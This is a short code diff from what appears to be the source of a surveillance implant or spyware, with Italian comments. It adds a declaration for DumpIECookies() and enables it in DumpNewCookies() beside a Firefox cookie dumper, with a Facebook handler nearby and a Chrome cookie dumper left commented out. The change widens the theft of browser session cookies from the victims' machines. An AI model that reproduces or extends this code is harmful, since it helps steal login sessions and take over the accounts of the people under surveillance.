@@ -15,6 +15,7 @@
 
 extern DWORD HandleFaceBook(char *); // Handler per FaceBook
 extern int DumpFFCookies(void); // Cookie per Facebook
+extern int DumpIECookies(void); // Cookie per IExplorer
 
 extern wchar_t *UTF8_2_UTF16(char *str); // in firefox.cpp
 extern BOOL IsCrisisNetwork();
@@ -89,10 +90,9 @@ void LogSocialIMMessageW(WCHAR *program, WCHAR *topic, WCHAR *peers, WCHAR *auth
 void DumpNewCookies()
 {
 	ResetNewCookie();
-	// XXX Dumpa i cookie dai vari browaer
+	DumpIECookies();
 	DumpFFCookies();
-	//DumpIECookies();
-	//DumpCHCookies();
+	//DumpCHCookies(); // XXX
 }
 
 void CheckProcessStatus()
